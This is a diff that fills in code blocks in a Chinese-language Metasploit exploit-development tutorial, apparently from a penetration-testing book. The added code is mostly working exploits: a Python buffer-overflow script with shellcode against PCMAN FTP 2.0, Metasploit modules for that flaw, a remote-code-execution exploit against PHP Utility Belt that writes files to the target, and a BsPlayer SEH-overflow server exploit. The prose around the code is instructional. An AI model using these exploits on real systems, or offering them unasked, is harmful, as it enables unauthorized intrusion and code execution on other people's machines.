@@ -16,7 +16,45 @@
 
 在即将到来的示例中，我们将看到如何将用 Python 编写的利用导入 Metasploit。公开可用的利用可以从以下网址下载：[`www.exploit-db.com/exploits/31255/`](https://www.exploit-db.com/exploits/31255/)。让我们按照以下方式分析利用：
 
-[PRE0]
+```
+import socket as s 
+from sys import argv 
+
+host = "127.0.0.1" 
+fuser = "anonymous" 
+fpass = "anonymous" 
+junk = '\x41' * 2008 
+espaddress = '\x72\x93\xab\x71' 
+nops = 'x90' * 10 
+shellcode= ("\xba\x1c\xb4\xa5\xac\xda\xda\xd9\x74\x24\xf4\x5b\x29\xc9\xb1"
+"\x33\x31\x53\x12\x83\xeb\xfc\x03\x4f\xba\x47\x59\x93\x2a\x0e"
+"\xa2\x6b\xab\x71\x2a\x8e\x9a\xa3\x48\xdb\x8f\x73\x1a\x89\x23"
+"\xff\x4e\x39\xb7\x8d\x46\x4e\x70\x3b\xb1\x61\x81\x8d\x7d\x2d"
+"\x41\x8f\x01\x2f\x96\x6f\x3b\xe0\xeb\x6e\x7c\x1c\x03\x22\xd5"
+"\x6b\xb6\xd3\x52\x29\x0b\xd5\xb4\x26\x33\xad\xb1\xf8\xc0\x07"
+"\xbb\x28\x78\x13\xf3\xd0\xf2\x7b\x24\xe1\xd7\x9f\x18\xa8\x5c"
+"\x6b\xea\x2b\xb5\xa5\x13\x1a\xf9\x6a\x2a\x93\xf4\x73\x6a\x13"
+"\xe7\x01\x80\x60\x9a\x11\x53\x1b\x40\x97\x46\xbb\x03\x0f\xa3"
+"\x3a\xc7\xd6\x20\x30\xac\x9d\x6f\x54\x33\x71\x04\x60\xb8\x74"
+"\xcb\xe1\xfa\x52\xcf\xaa\x59\xfa\x56\x16\x0f\x03\x88\xfe\xf0"
+"\xa1\xc2\xec\xe5\xd0\x88\x7a\xfb\x51\xb7\xc3\xfb\x69\xb8\x63"
+"\x94\x58\x33\xec\xe3\x64\x96\x49\x1b\x2f\xbb\xfb\xb4\xf6\x29"
+"\xbe\xd8\x08\x84\xfc\xe4\x8a\x2d\x7c\x13\x92\x47\x79\x5f\x14"
+"\xbb\xf3\xf0\xf1\xbb\xa0\xf1\xd3\xdf\x27\x62\xbf\x31\xc2\x02"
+ "\x5a\x4e")
+
+sploit = junk+espaddress+nops+shellcode
+conn = s.socket(s.AF_INET,s.SOCK_STREAM)
+conn.connect((host,21))
+conn.send('USER '+fuser+'\r\n')
+uf = conn.recv(1024)
+conn.send('PASS '+fpass+'\r\n')
+pf = conn.recv(1024)
+conn.send('CWD '+sploit+'\r\n')
+cf = conn.recv(1024)
+conn.close()
+
+```
 
 这个简单的利用通过匿名凭据登录到端口`21`上的 PCMAN FTP 2.0 软件，并使用`CWD`命令利用软件。
 
@@ -72,11 +110,67 @@
 
 现在让我们看一下 Metasploit 中利用的等效代码：
 
-[PRE1]
+```
+class MetasploitModule < Msf::Exploit::Remote 
+  Rank = NormalRanking 
+
+  include Msf::Exploit::Remote::Ftp 
+
+  def initialize(info = {}) 
+    super(update_info(info, 
+      'Name'           => 'PCMAN FTP Server Post-Exploitation CWD Command', 
+      'Description'    => %q{ 
+          This module exploits a buffer overflow vulnerability in PCMAN FTP 
+      }, 
+      'Author'         => 
+          [ 
+            'Nipun Jaswal' 
+          ], 
+      'DefaultOptions' => 
+        { 
+          'EXITFUNC' => 'process', 
+          'VERBOSE'  => true 
+        }, 
+      'Payload'        => 
+        { 
+          'Space'   => 1000, 
+          'BadChars'  => "\x00\xff\x0a\x0d\x20\x40", 
+        }, 
+      'Platform'       => 'win', 
+      'Targets'        => 
+        [ 
+          [ 'Windows XP SP2 English', 
+            { 
+              'Ret' => 0x71ab9372, 
+              'Offset' => 2008 
+            } 
+          ], 
+        ], 
+      'DisclosureDate' => 'May 9 2016', 
+      'DefaultTarget'  => 0)) 
+register_options( 
+        [ 
+                Opt::RPORT(21), 
+         OptString.new('FTPPASS', [true, 'FTP Password', 'anonymous']) 
+        ]) 
+  End 
+```
 
 在上一章中，我们处理了许多利用模块。这个利用也不例外。我们首先包含了所有必需的库和`/lib/msf/core/exploit`目录中的`ftp.rb`库。接下来，在`initialize`部分中分配了所有必要的信息。从利用中收集必要的信息后，我们将`Ret`分配为返回地址，并将`Offset`设置为`2008`。我们还将`FTPPASS`选项的值声明为`'anonymous'`。让我们看看下一节代码：
 
-[PRE2]
+```
+def exploit 
+    c = connect_login 
+    return unless c 
+    sploit = rand_text_alpha(target['Offset']) 
+    sploit << [target.ret].pack('V') 
+    sploit << make_nops(10) 
+    sploit << payload.encoded 
+    send_cmd( ["CWD " + sploit, false] ) 
+    disconnect 
+  end 
+end 
+```
 
 `connect_login`方法将连接到目标并尝试使用我们提供的匿名凭据登录软件。但等等！我们什么时候提供了凭据？模块的`FTPUSER`和`FTPPASS`选项会自动启用，包括 FTP 库。`FTPUSER`的默认值是`anonymous`。但是，对于`FTPPASS`，我们已经在`register_options`中提供了值`anonymous`。
 
@@ -112,7 +206,20 @@
 
 在 Metasploit 中，可以在利用易受攻击的应用程序之前检查易受攻击的版本。这非常重要，因为如果目标运行的应用程序版本不易受攻击，可能会导致应用程序崩溃，利用目标的可能性变为零。让我们编写一个示例检查代码，检查我们在上一节中利用的应用程序的版本。
 
-[PRE3]
+```
+  def check 
+    c = connect_login 
+    disconnect 
+    if c and banner =~ /220 PCMan's FTP Server 2\.0/ 
+      vprint_status("Able to authenticate, and banner shows the vulnerable version") 
+      return Exploit::CheckCode::Appears 
+     elsif not c and banner =~ /220 PCMan's FTP Server 2\.0/ 
+      vprint_status("Unable to authenticate, but banner shows the vulnerable version") 
+      return Exploit::CheckCode::Appears 
+    end 
+    return Exploit::CheckCode::Safe 
+  end 
+```
 
 我们通过调用`connect_login`方法开始`check`方法。这将建立与目标的连接。如果连接成功并且应用程序返回横幅，我们将使用正则表达式将其与受影响的应用程序的横幅进行匹配。如果匹配成功，我们将使用`Exploit::Checkcode::Appears`标记应用程序为易受攻击。但是，如果我们无法进行身份验证但横幅是正确的，我们将返回相同的`Exploit::Checkcode::Appears`值，表示应用程序易受攻击。如果所有这些检查都失败，我们将返回`Exploit::CheckCode::Safe`，标记应用程序为不易受攻击。
 
@@ -186,17 +293,79 @@
 
 让我们按照以下方式编写 Metasploit 中 PHP 实用程序皮带远程代码执行漏洞的利用：
 
-[PRE4]
+```
+class MetasploitModule < Msf::Exploit::Remote 
+
+  include Msf::Exploit::Remote::HttpClient 
+
+  def initialize(info = {}) 
+    super(update_info(info, 
+      'Name'           => 'PHP Utility Belt Remote Code Execution', 
+      'Description'    => %q{ 
+         This module exploits a remote code execution vulnerability in PHP Utility Belt 
+      }, 
+      'Author'         => 
+        [ 
+          'Nipun Jaswal', 
+        ], 
+      'DisclosureDate' => 'May 16 2015', 
+      'Platform'       => 'php', 
+      'Payload'        => 
+        { 
+          'Space'       => 2000, 
+          'DisableNops' => true 
+        }, 
+      'Targets'        => 
+        [ 
+          ['PHP Utility Belt', {}] 
+        ], 
+      'DefaultTarget'  => 0 
+    )) 
+
+    register_options( 
+      [ 
+        OptString.new('TARGETURI', [true, 'The path to PHP Utility Belt', '/php-utility-belt/ajax.php']), 
+   OptString.new('CHECKURI',[false,'Checking Purpose','/php-utility-belt/info.php']), 
+      ]) 
+  end 
+```
 
 我们可以看到我们已经声明了所有必需的库，并在初始化部分提供了必要的信息。由于我们正在利用基于 PHP 的漏洞，我们选择平台为 PHP。我们将`DisableNops`设置为 true，以关闭有效载荷中的`NOP`使用，因为利用针对的是 Web 应用程序中的远程代码执行漏洞，而不是基于软件的漏洞。我们知道漏洞存在于`ajax.php`文件中。因此，我们将`TARGETURI`的值声明为`ajax.php`文件。我们还创建了一个名为`CHECKURI`的新字符串变量，它将帮助我们为利用创建一个检查方法。让我们看一下利用的下一部分：
 
-[PRE5]
+```
+def check 
+  send_request_cgi( 
+      'method'    => 'POST', 
+      'uri'       => normalize_uri(target_uri.path), 
+      'vars_post' => { 
+        'code' => "fwrite(fopen('info.php','w'),'<?php echo phpinfo();?>');" 
+      } 
+   ) 
+  resp = send_request_raw({'uri' => normalize_uri(datastore['CHECKURI']),'method' => 'GET'}) 
+  if resp.body =~ /phpinfo()/ 
+   return Exploit::CheckCode::Vulnerable 
+  else 
+   return Exploit::CheckCode::Safe 
+  end 
+  end 
+```
 
 我们使用`send_request_cgi`方法以高效的方式容纳`POST`请求。我们将方法的值设置为`POST`，将 URI 设置为规范化格式中的目标 URI，并将`POST`参数`CODE`的值设置为`fwrite(fopen('info.php','w'),'<?php echo phpinfo();?>');`。这个有效载荷将创建一个名为`info.php`的新文件，同时编写代码，当执行时将显示一个 PHP 信息页面。我们创建了另一个请求，用于获取我们刚刚创建的`info.php`文件的内容。我们使用`send_request_raw`技术并将方法设置为`GET`来执行此操作。我们之前创建的`CHECKURI`变量将作为此请求的 URI。
 
 我们可以看到我们将请求的结果存储在`resp`变量中。接下来，我们将`resp`的主体与`phpinfo()`表达式进行匹配。如果结果为真，将表示`info.php`文件已成功创建到目标上，并且`Exploit::CheckCode::Vulnerable`的值将返回给用户，显示标记目标为易受攻击的消息。否则，它将使用`Exploit::CheckCode::Safe`将目标标记为安全。现在让我们进入利用方法：
 
-[PRE6]
+```
+  def exploit 
+    send_request_cgi( 
+      'method'    => 'POST', 
+      'uri'       => normalize_uri(target_uri.path), 
+      'vars_post' => { 
+        'code' => payload.encoded 
+      } 
+    ) 
+  end 
+end 
+```
 
 我们可以看到我们刚刚创建了一个带有我们有效载荷的简单`POST`请求。一旦它在目标上执行，我们就会获得 PHP Meterpreter 访问权限。让我们看看这个利用的效果：
 
@@ -247,11 +416,53 @@
 
 让我们开始在 Metasploit 中编写我们的漏洞的编码部分：
 
-[PRE7]
+```
+class MetasploitModule < Msf::Exploit::Remote 
+  Rank = NormalRanking 
+
+  include Msf::Exploit::Remote::TcpServer 
+
+  def initialize(info={}) 
+    super(update_info(info, 
+      'Name'           => "BsPlayer 2.68 SEH Overflow Exploit", 
+      'Description'    => %q{ 
+        Here's an example of Server Based Exploit 
+      }, 
+      'Author'         => [ 'Nipun Jaswal' ], 
+      'Platform'       => 'win', 
+      'Targets'        => 
+        [ 
+          [ 'Generic', {'Ret' => 0x0000583b, 'Offset' => 2048} ], 
+        ], 
+      'Payload'  =>  
+       { 
+       'BadChars' => "\x00\x0a\x20\x0d" 
+       }, 
+      'DisclosureDate' => "May 19 2016", 
+      'DefaultTarget'  => 0)) 
+  end 
+```
 
 通过与许多漏洞一起工作，我们可以看到前面的代码部分并无不同，除了来自`/lib/msf/core/exploit/tcp_server.rb`的 TCP 服务器库文件。TCP 服务器库提供了处理传入请求并以各种方式处理它们所需的所有必要方法。包含此库使得额外选项如`SRVHOST`、`SRVPORT`和`SSL`成为可能。让我们看看代码的剩余部分：
 
-[PRE8]
+```
+def on_client_connect(client) 
+return if ((p = regenerate_payload(client)) == nil) 
+    print_status("Client Connected") 
+    sploit = make_nops(target['Offset']) 
+    sploit << payload.encoded 
+    sploit << "\xcc" * (6787-2048 - payload.encoded.length)  
+    sploit << "\xe9\x85\xe9\xff\xff"  
+    sploit << "\xeb\xf9\x90\x90" 
+    sploit << [target.ret].pack('V') 
+    client.put(sploit) 
+    client.get_once 
+    client.put(sploit) 
+    handler(client) 
+    service.close_client(client) 
+  end 
+end 
+```
 
 我们可以看到，我们没有这种类型漏洞的漏洞方法。但是，我们有`on_client_connect`、`on_client_data`和`on_client_disconnect`方法。最有用且最简单的是`on_client_connect`方法。一旦客户端连接到所选的`SRVHOST`和`SRVPORT`上的漏洞服务器，此方法将被触发。
 
